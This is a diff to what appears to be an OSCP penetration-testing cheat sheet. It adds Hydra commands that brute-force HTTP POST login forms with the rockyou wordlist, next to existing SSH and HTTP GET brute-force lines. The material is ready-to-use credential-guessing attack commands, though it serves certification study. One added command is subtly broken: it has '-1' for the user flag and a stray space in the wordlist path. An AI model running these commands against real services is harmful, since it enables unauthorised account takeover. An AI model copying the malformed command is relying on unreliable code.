@@ -79,8 +79,12 @@ SMB Brute Force - Hydra
 SSH Brute Force - Hydra
 `hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>`
 
-HTTP POST Login Form Brute Force - Hydra
-`hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f`
+HTTP POST Login Form (login forms) Brute Force - Hydra, brute force username and password
+`hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:usernamefieldname=^USER^&passwordfieldname=^PASS^:Login failed text" -vV -f`
+
+HTTP POST Login Form (login forms) Brute Force - Hydra, bruteforce password only
+`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -1 admin -P /usr/share/wordlists/rockyou. txt -vV -f`
+![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a78ffd2d-a33b-4f53-8574-9b6a4a7f4c40)
 
 HTTP GET Login Form Brute Force - Hydra
 `hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login`
